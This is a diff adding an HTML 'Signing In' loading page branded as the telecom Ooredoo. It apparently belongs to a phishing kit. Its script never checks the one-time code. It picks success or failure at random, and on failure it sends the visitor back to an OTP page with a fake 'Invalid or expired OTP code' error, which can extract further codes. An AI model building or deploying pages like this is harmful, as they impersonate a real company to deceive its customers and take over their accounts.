@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Loading - Ooredoo</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #D0191F;
+    --white: #FFFFFF;
+    --text: #1A1A1A;
+    --text-light: #808080;
+    --line: #D0D0D0;
+    --bg: #FAFAFA;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body { 
+    font-family: 'Cairo', Tahoma, Arial, sans-serif; 
+    background: var(--bg); 
+    color: var(--text);
+    display: flex;
+    flex-direction: column;
+  }
+
+  .container {
+    flex: 1; max-width: 1200px; width: 100%; margin: 0 auto;
+    padding: 60px 24px; padding-bottom: max(40px, env(safe-area-inset-bottom, 0px));
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+  }
+
+  .loading-content { text-align: center; }
+
+  .spinner {
+    width: 80px;
+    height: 80px;
+    border: 6px solid var(--line);
+    border-top-color: var(--red);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 32px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  h2 {
+    font-size: 1.5rem;
+    color: var(--text);
+    margin-bottom: 12px;
+    font-weight: 700;
+  }
+
+  p {
+    color: var(--text-light);
+    font-size: 1rem;
+    font-weight: 500;
+  }
+
+  @media (max-width: 480px) {
+    .container { padding: 48px 20px; }
+    h2 { font-size: 1.3rem; }
+    .spinner { width: 60px; height: 60px; border-width: 5px; }
+  }
+</style>
+</head>
+<body>
+
+<main class="container">
+  <div class="loading-content">
+    <div class="spinner"></div>
+    <h2>Signing In</h2>
+    <p>Please wait...</p>
+  </div>
+</main>
+
+<script>
+  // Mock loading - 50% chance of success or failure
+  setTimeout(() => {
+    const isSuccess = Math.random() > 0.5;
+    
+    if (isSuccess) {
+      // Verification succeeded - go to success page
+      sessionStorage.removeItem('otpCode');
+      window.location.href = 'success_ooredoo_en.html';
+    } else {
+      // Verification failed - back to OTP page with error message
+      sessionStorage.setItem('otpError', 'Invalid or expired OTP code');
+      window.location.href = 'otp_ooredoo_en.html';
+    }
+  }, 2500);
+</script>
+
+</body>
+</html>
